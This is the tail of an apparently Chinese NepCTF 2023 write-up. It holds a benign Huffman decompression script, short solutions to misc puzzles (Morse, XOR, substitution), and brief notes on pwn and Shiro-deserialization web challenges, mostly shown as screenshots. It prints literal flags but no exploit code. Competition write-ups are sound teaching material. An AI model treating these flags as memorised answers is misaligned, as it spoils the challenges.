punctuation\">:</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>            byte <span class=\"token operator\">=</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>            freq <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">24</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>            frequencies<span class=\"token punctuation\">[</span>byte<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> freq</pre></td></tr><tr><td data-num=\"95\"></td><td><pre></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>        root <span class=\"token operator\">=</span> build_huffman_tree_from_bytes<span class=\"token punctuation\">(</span>frequencies<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>        huffman_codes <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>        build_huffman_codes<span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">,</span> <span class=\"token string\">''</span><span class=\"token punctuation\">,</span> huffman_codes<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>        reverse_huffman_codes <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>v<span class=\"token punctuation\">:</span> k <span class=\"token keyword\">for</span> k<span class=\"token punctuation\">,</span> v <span class=\"token keyword\">in</span> huffman_codes<span class=\"token punctuation\">.</span>items<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>        decompressed_data <span class=\"token operator\">=</span> <span class=\"token builtin\">bytearray</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>        code <span class=\"token operator\">=</span> <span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>        <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>            byte <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>byte<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>                <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre></pre></td></tr><tr><td data-num=\"109\"></td><td><pre>            byte <span class=\"token operator\">=</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>byte<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>            <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>                <span class=\"token keyword\">if</span> byte <span class=\"token operator\">&amp;</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span> <span class=\"token operator\">&lt;&lt;</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>                    code <span class=\"token operator\">+=</span> <span class=\"token string\">'1'</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>                <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre>                    code <span class=\"token operator\">+=</span> <span class=\"token string\">'0'</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre></pre></td></tr><tr><td data-num=\"116\"></td><td><pre>                <span class=\"token keyword\">if</span> code <span class=\"token keyword\">in</span> reverse_huffman_codes<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre>                    decompressed_data<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>reverse_huffman_codes<span class=\"token punctuation\">[</span>code<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre>                    code <span class=\"token operator\">=</span> <span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"119\"></td><td><pre></pre></td></tr><tr><td data-num=\"120\"></td><td><pre>    <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>output_file<span class=\"token punctuation\">,</span> <span class=\"token string\">'wb'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"121\"></td><td><pre>        f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span>decompressed_data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"122\"></td><td><pre></pre></td></tr><tr><td data-num=\"123\"></td><td><pre></pre></td></tr><tr><td data-num=\"124\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"125\"></td><td><pre>    <span class=\"token comment\"># input_file = 'input.txt'</span></pre></td></tr><tr><td data-num=\"126\"></td><td><pre>    compressed_file <span class=\"token operator\">=</span> <span class=\"token string\">'compressed.bin'</span></pre></td></tr><tr><td data-num=\"127\"></td><td><pre>    decompressed_file <span class=\"token operator\">=</span> <span class=\"token string\">'decompressed.txt'</span></pre></td></tr><tr><td data-num=\"128\"></td><td><pre></pre></td></tr><tr><td data-num=\"129\"></td><td><pre>    <span class=\"token comment\"># 压缩文件</span></pre></td></tr><tr><td data-num=\"130\"></td><td><pre>    <span class=\"token comment\"># compress(input_file, compressed_file)</span></pre></td></tr><tr><td data-num=\"131\"></td><td><pre></pre></td></tr><tr><td data-num=\"132\"></td><td><pre>    <span class=\"token comment\"># 解压缩文件</span></pre></td></tr><tr><td data-num=\"133\"></td><td><pre>    decompress<span class=\"token punctuation\">(</span>compressed_file<span class=\"token punctuation\">,</span> decompressed_file<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"/img/wp/2.png\" alt=\"\"></p>\n<h4 id=\"3connectedfive\"><a class=\"markdownIt-Anchor\" href=\"#3connectedfive\">#</a> 3.ConnectedFive</h4>\n<p>五子连珠，到 42 即可拿 flag</p>\n<p><img data-src=\"/img/wp/3.png\" alt=\"\"></p>\n<h4 id=\"4checkin\"><a class=\"markdownIt-Anchor\" href=\"#4checkin\">#</a> 4.CheckIn</h4>\n<blockquote>\n<p>NepCTF H4ve_Fun_1N_This_Game}</p>\n</blockquote>\n<h4 id=\"5陌生的语言\"><a class=\"markdownIt-Anchor\" href=\"#5陌生的语言\">#</a> 5. 陌生的语言</h4>\n<p><img data-src=\"/img/wp/1.jpg\" alt=\"1\"></p>\n<p><img data-src=\"/img/wp/1691849788716.jpg\" alt=\"1691849788716\"></p>\n<p>对照码表：NEPNEP_A_BELIEVING_HEART_IS_YOUR_MAGIC</p>\n<p>NepCTF NEPNEP_A_BELIEVING_HEART_IS_YOUR_MAGIC}</p>\n<h4 id=\"6小叮弹钢琴\"><a class=\"markdownIt-Anchor\" href=\"#6小叮弹钢琴\">#</a> 6. 小叮弹钢琴</h4>\n<p>音频有信息</p>\n<blockquote>\n<p>0x370a05303c290e045005031c2b1858473a5f052117032c39230f005d1e17</p>\n</blockquote>\n<blockquote>\n<p>-.–/—/…-/…/…/—/…-/.-…/-…/…-/…/./-/…/…/…/-/—/-…-/—/.-./…/—/–/./-/…/…/-./–.</p>\n</blockquote>\n<p>摩斯转化</p>\n<blockquote>\n<p>YOU SHOULD USE THIS TO XOR SOME THING</p>\n</blockquote>\n<p>异或字符串（16 进制转化）</p>\n<blockquote>\n<p>0x6e 0x45 0x50 0x63 0x74 0x66 0x5b 0x48 0x14 0x50 0x50 0x59 0x7f 0x50 0x11 0x14 0x6e 0x10 0x5d<br>\n0x6e 0x45 0x50 0x63 0x74 0x66 0x5b 0x48 0x14 0x50 0x50</p>\n</blockquote>\n<p>修改一下：找下规律去修改一下</p>\n<blockquote>\n<p>0x4e 0x65 0x70 0x43 0x54 0x46 0x7b 0x68 0x34 0x70 0x70 0x79 0x5f 0x70 0x31 0x34 0x4e 0x30 0x7d</p>\n</blockquote>\n<blockquote>\n<p>NepCTF h4ppy_p14N0}</p>\n</blockquote>\n<h4 id=\"7问卷\"><a class=\"markdownIt-Anchor\" href=\"#7问卷\">#</a> 7. 问卷</h4>\n<p><img data-src=\"/img/wp/image-20230813202714138.png\" alt=\"image-20230813202714138\"></p>\n<h2 id=\"2-pwn\"><a class=\"markdownIt-Anchor\" href=\"#2-pwn\">#</a> 2. pwn:</h2>\n<h4 id=\"hrp-chat-4\"><a class=\"markdownIt-Anchor\" href=\"#hrp-chat-4\">#</a> HRP-CHAT-4</h4>\n<p><img data-src=\"/img/wp/image-20230813203342637.png\" alt=\"image-20230813203342637\"></p>\n<p><img data-src=\"/img/wp/image-20230813203738235.png\" alt=\"image-20230813204233847\"></p>\n<p>一直买直到破坏子线程，然后执行   Safe_Mode_Key</p>\n<p>得到 flag：This is your key!</p>\n<blockquote>\n<p>Nepctf  IAMFOUR_b924541f-bd73-16f1-418d-932d681eb691</p>\n</blockquote>\n<h4 id=\"hrp-chat-3\"><a class=\"markdownIt-Anchor\" href=\"#hrp-chat-3\">#</a> HRP-CHAT-3</h4>\n<p><img data-src=\"/img/wp/image-20230813204233847.png\" alt=\"image-20230813204233847\"></p>\n<p>把 Boss 能得到 flag，只能去抽奖，但抽不到最高的，但是 H3h3QAQ 够用了</p>\n<p><img data-src=\"/img/wp/image-20230813204151370.png\" alt=\"image-20230813204151370\"></p>\n<p><img data-src=\"/img/wp/image-20230813204502026.png\" alt=\"image-20230813204502026\"></p>\n<p>序号是 9</p>\n<p><img data-src=\"/img/wp/image-20230813204547270.png\" alt=\"image-20230813204547270\"></p>\n<p>得到 flag</p>\n<h2 id=\"3-web\"><a class=\"markdownIt-Anchor\" href=\"#3-web\">#</a> 3. web:</h2>\n<h4 id=\"ez_java_checkin\"><a class=\"markdownIt-Anchor\" href=\"#ez_java_checkin\">#</a> ez_java_checkin</h4>\n<p>shiro 反序列化</p>\n<p><img data-src=\"/img/wp/image-20230813205114576.png\" alt=\"image-20230813205114576\"></p>\n<p><img data-src=\"/img/wp/image-20230813205917940.png\" alt=\"image-20230813205917940\"></p>\n<p><img data-src=\"/img/wp/image-20230813210003062.png\" alt=\"image-20230813210003062\"></p>\n<p>得到 flag。</p>\n",
            "tags": [
                "wp"
            ]
        }
    ]
}